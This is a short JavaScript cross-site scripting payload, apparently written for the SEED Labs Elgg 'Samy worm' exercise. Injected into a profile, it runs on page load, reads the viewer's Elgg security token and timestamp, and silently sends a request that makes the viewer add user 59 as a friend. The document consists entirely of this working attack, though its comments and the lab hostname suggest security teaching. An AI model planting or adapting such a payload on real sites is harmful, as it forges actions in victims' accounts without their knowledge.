<script type="text/javascript">
window.onload = function(){
    var Ajax = null;
    var friend="friend=59";     // The link

    // These values are in the "elgg.js" file
    var ts = "__elgg_ts=" + elgg.security.token.__elgg_ts;          // Time Stamp
    var token = "__elgg_token=" + elgg.security.token.__elgg_token; // Token

    // Construct a HTTP Request to send Samy a friend request
    var sendurl = "http://www.seed-server.com/action/friends/add?" + friend + "&" + ts + "&" + token;

    // Create AJAX request to add friend - AJAX: Asynchronous JavaScript And XML.
    Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl);
    Ajax.send();
}
</script>